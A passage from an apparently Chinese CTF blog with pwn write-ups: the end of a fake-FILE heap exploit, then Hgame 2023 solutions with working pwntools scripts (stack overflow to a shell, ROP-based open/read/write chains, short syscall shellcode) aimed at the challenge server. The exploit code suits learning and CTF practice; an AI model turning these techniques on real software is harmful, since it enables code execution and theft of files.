_IO_save_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_backup_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_save_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _markers</span><br>    <br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain,could be a anathor file struct</span><br>    <br>    fake_file += p32(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _fileno</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _flags2</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _old_offset</span><br>    fake_file += p16(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _cur_column</span><br>    fake_file += p8(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _vtable_offset</span><br>    fake_file += p8(<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># _shortbuf</span><br>    fake_file += p32(<span class="hljs-number">0</span>)<br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _lock</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _offset</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _codecvt</span><br>    fake_file += p64(_wide_data)  <span class="hljs-comment"># _wide_data</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_list</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _freeres_buf</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># __pad5</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode</span><br>    fake_file += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>  <span class="hljs-comment"># unused2</span><br>    fake_file += p64(vtable)  <span class="hljs-comment"># fake_vtable</span><br>    <span class="hljs-keyword">return</span> fake_file<br><br>payload =  build_fake_file( <span class="hljs-number">0</span> , <span class="hljs-number">0</span> ,<span class="hljs-number">0</span> , heap_base+<span class="hljs-number">0x1f0</span>)<br>payload += p64(system)*<span class="hljs-number">4</span>   <span class="hljs-comment">#fake_vtable + 0x18 = system</span><br><br>add(<span class="hljs-built_in">int</span>(size), payload) <span class="hljs-comment">#fake_IO</span><br><br><br>edit(global_max_fast)<br><br><br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#debug()</span><br><br>exit()<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="6-kheap"><a href="#6-kheap" class="headerlink" title="6. kheap"></a>6. kheap</h2><p>是道kernel_heap，后面做内核pwn再研究</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame_2023</title>
    <link href="/2023/03/03/Hgame2023/"/>
    <url>/2023/03/03/Hgame2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2023"><a href="#Hgame2023" class="headerlink" title="Hgame2023"></a>Hgame2023</h1><h2 id="1-easy-overflow"><a href="#1-easy-overflow" class="headerlink" title="1.easy_overflow"></a>1.easy_overflow</h2><p>在程序<code>close(1)</code>的前提下</p><p>获取到了shell，执行<code>exec 1&gt;&amp;0</code>命令重启命令行，便可输出内容</p><p>（或者<code>exec &lt; flag</code>，将flag打印到当前终端）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span><br>port = <span class="hljs-number">32054</span><br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x401176</span>)<br>sl(payload)<br>     <br>sl(<span class="hljs-string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="2-ORW"><a href="#2-ORW" class="headerlink" title="2.ORW"></a>2.ORW</h2><ol><li><strong>泄露libc</strong></li><li><strong>计算Gadget地址</strong></li><li><strong>输入空间不够，伪造read_syscall</strong></li><li><strong>手搓&amp;工具：构造orw链子 – open flag;  read到栈上;  write输出</strong></li></ol><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a><strong>调用约定</strong></h4><ul><li>系统调用号：<code>$rax</code></li><li>第一个参数：<code>$rdi</code></li><li>第二个参数：<code>$rsi</code></li><li>第三个参数：<code>$rdx</code></li><li>第 4 个参数：<code>$r10</code></li><li>第 5 个参数：<code>$r8</code></li><li>第 6 个参数：<code>$r9</code></li><li><code>syscall</code></li></ul><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#---------------------open-------------------------<br>xor rsi ,rsi  #这里0代表只读，选择异或是防止出现0字符，有些时候有影响<br>xor rdx,rdx       #这里是读文件，就不需要设置mode,写成0就好<br>mov rax,0x67616c662f2e; #pwntools的汇编好像不能push太大的，虽然在x64位里面这个是可以放下的 ./flag<br>push rax;<br>mov rdi,rsp; #设置为我们字符串的位置<br>mov rax,2; #代表open<br>syscall;<br><br>#---------------------read-------------------------<br>mov rdi,rax<br>mov rsi,rsp  #设置保存的位置<br>mov rdx,0x30<br>mov rax,0 #read到我们的栈上<br>syscall<br><br>#---------------------write-------------------------<br>mov rdi,1 #1代表标准输出<br>mov rsi,rsp<br>mov rdx,0x30<br>mov rax,1#写到我们的标准输出来<br>syscall<br></code></pre></td></tr></table></figure><p><strong>pwntools工具</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sh3=asm(shellcraft.open(&#x27;./flag.txt&#x27;))</span><br>sh3+=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>sh3+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap_place+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>))<br>sh3+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap_place+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>))<br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>本题为ret2libc，寻找ROP链，可在权限为rw–权限下进行</strong></p><p>实际是通过rop链，模拟shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#orw_payload = b&#x27;./flag\x00\x00&#x27;</span><br>orw_payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rsi_ret) + p64(stack_addr) + p64(libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(leave_ret)<br>orw_payload += p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br>orw_payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi_ret) + p64(stack_addr) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0x50</span>) + p64(libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]) <br>orw_payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi_ret) + p64(stack_addr) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0x30</span>) + p64(libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br></code></pre></td></tr></table></figure><p><strong>下面这种orw，是ret2shellcode，需要有内存空间为rwx-权限</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sh3=asm(shellcraft.open(&#x27;./flag.txt&#x27;))</span><br>sh3+=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>sh3+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap_place+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>))<br>sh3+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap_place+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>))<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><strong>exp</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br><br>ip = <span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span><br>port = <span class="hljs-number">30604</span><br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">0</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------1.leak libc------------------</span><br>rdi_ret = <span class="hljs-number">0x0000000000401393</span><br>rsi_r15_ret = <span class="hljs-number">0x0000000000401391</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br>main = <span class="hljs-number">0x40130C</span><br>leave_ret = <span class="hljs-number">0x4012EE</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>] <br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">256</span> + p64(<span class="hljs-number">0</span>) <br>payload += p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br>sa(<span class="hljs-string">b&#x27;task.&#x27;</span>,payload)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg(<span class="hljs-string">&#x27;puts_addr&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#------------------2.Gadget---------------------</span><br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()<br>pop_rsi_ret = libc_base + <span class="hljs-number">0x2601f</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x142c92</span><br><br><br><br>fake_stack = <span class="hljs-number">0x404060</span> + <span class="hljs-number">0x200</span> <span class="hljs-comment">#bss_end + 0x200</span><br>flag = fake_stack<br>flag_content = <span class="hljs-number">0x404060</span> + <span class="hljs-number">0x300</span><br>leave_ret = <span class="hljs-number">0x00000000004012be</span><br><br><span class="hljs-comment">#-----------------3.Stack_pivot + read----------</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span> + p64(fake_stack)<br>payload += p64(pop_rsi_ret) + p64(fake_stack)<br>payload += p64(read_addr) + p64(leave_ret) <br><br>sa(<span class="hljs-string">b&#x27;task.&#x27;</span>, payload)<br><br><span class="hljs-comment">#------------------4.ORW------------------------</span><br><span class="hljs-comment">#orw_payload = b&#x27;./flag\x00\x00&#x27;</span><br>orw_payload = <span class="hljs-string">b&quot;./flag\x00\x00&quot;</span><br>orw_payload += p64(pop_rdi_ret) + p64(flag) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(open_addr)  <span class="hljs-comment">#open</span><br>orw_payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi_ret) + p64(flag_content) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0xff</span>) + p64(read_addr) <span class="hljs-comment">#read</span><br>orw_payload += p64(pop_rdi_ret) + p64(flag_content) + p64(puts_addr) <span class="hljs-comment">#puts</span><br><br>sleep(<span class="hljs-number">0.5</span>)<br>s(orw_payload)<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="3-simple-shellcode"><a href="#3-simple-shellcode" class="headerlink" title="3.simple_shellcode"></a>3.simple_shellcode</h2><h3 id="调用号"><a href="#调用号" class="headerlink" title="调用号"></a>调用号</h3><p><code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_read 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_write 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_open 2</span><br></code></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><strong>sandbox</strong></p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs as"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0004</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000142</span>  <span class="hljs-keyword">if</span> (A == execveat) goto <span class="hljs-number">0004</span><br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><p><strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0xCAFE0000</span>LL, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your shellcode:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)<span class="hljs-number">0xCAFE0000</span>LL, <span class="hljs-number">0x10</span>uLL);<br>  sandbox();<br>  MEMORY[<span class="hljs-number">0xCAFE0000</span>]();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只有0x10字节，所以通过构造一个read，再写shellcode</p><p><code>read(0, 0xCAFE0000, 0x100)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax, 0   #调用号<br>mov rdi, 0#第一个参数:fd<br>mov rsi, 0xCAFE0000 #第二个参数:buf<br>mov rdx, 0x100#第三个参数:size<br>syscall<br><br></code></pre></td></tr></table></figure><p>pwntools翻译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    mov rsi, 0xCAFE0000</span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(shellcode)<br></code></pre></td></tr></table></figure><p><strong>但是很明显，长度大于0x10</strong></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p><strong>shellcode执行位置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x55646e0553b0 &lt;main+122&gt;       mov    rdx, qword ptr [rbp - 8]<br>   0x55646e0553b4 &lt;main+126&gt;       mov    eax, 0<br> ► 0x55646e0553b9 &lt;main+131&gt;       call   rdx                           &lt;0xcafe0000&gt;<br> <br>   0x55646e0553bb &lt;main+133&gt;       mov    eax, 0<br>   0x55646e0553c0 &lt;main+138&gt;       leave  <br>   0x55646e0553c1 &lt;main+139&gt;       ret <br><br>#寄存器<br> RAX  0x0<br> RBX  0x55646e0553d0 (__libc_csu_init) ◂— endbr64 <br> RCX  0x7f0d9feeed3e (prctl+14) ◂— cmp    rax, -0xfff<br> RDX  0xcafe0000 ◂— mov    rsi, rdx /* 0x24242c8348d68948 */<br> RDI  0x16<br> RSI  0x2<br> R8   0x0<br> R9   0x0<br> R10  0x7f0d9feeed3e (prctl+14) ◂— cmp    rax, -0xfff<br> R11  0x217<br> R12  0x55646e055100 (_start) ◂— endbr64 <br> R13  0x7ffef8370030 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7ffef836ff40 ◂— 0x0<br> RSP  0x7ffef836ff30 —▸ 0x7ffef8370030 ◂— 0x1<br>*RIP  0x55646e0553b9 (main+131) ◂— call   rdx<br></code></pre></td></tr></table></figure><p><strong>目的：是往0xcafe0000地址处，继续写东西</strong></p><h3 id="解法1：缩短read-shellcode"><a href="#解法1：缩短read-shellcode" class="headerlink" title="解法1：缩短read_shellcode"></a>解法1：缩短read_shellcode</h3><p><strong>根据上图的寄存器，写汇编，实现一个新read函数的系统调用，尽可能缩短长度–使用32位寄存器及指令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> RAX  0x0<br> RBX  0x55646e0553d0 (__libc_csu_init) ◂— endbr64 <br> RCX  0x7f0d9feeed3e (prctl+14) ◂— cmp    rax, -0xfff<br> RDX  0xcafe0000 ◂— mov    rsi, rdx /* 0x24242c8348d68948 */<br> RDI  0x16<br> RSI  0x2<br> R8   0x0<br> R9   0x0<br> R10  0x7f0d9feeed3e (prctl+14) ◂— cmp    rax, -0xfff<br> R11  0x217<br> R12  0x55646e055100 (_start) ◂— endbr64 <br> R13  0x7ffef8370030 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> <br>mov rax, 0 #已经满足<br>mov rdi, 0 <br>mov rsi, 0xCAFE0000<br>mov rdx, 0x100<br>syscall<br></code></pre></td></tr></table></figure><p><strong>1-1：利用原本寄存器，缩短shellcode</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">edx</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edi</span>,<span class="hljs-built_in">edi</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><p><strong>1-2：xchg指令</strong></p><p>原子指令，交换两个数据()的值, <code>xchg dest ,src</code></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">xchg</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">esi</span><br><span class="hljs-keyword">xchg</span> <span class="hljs-built_in">r14d</span>, <span class="hljs-built_in">edi</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><p><strong>2：借助<code>nop</code>滑板划到orw的shellcode</strong></p><p>滑板指令：nop</p><p>当碰见这些指令时，不会执行，直接一条条跳过</p><p> 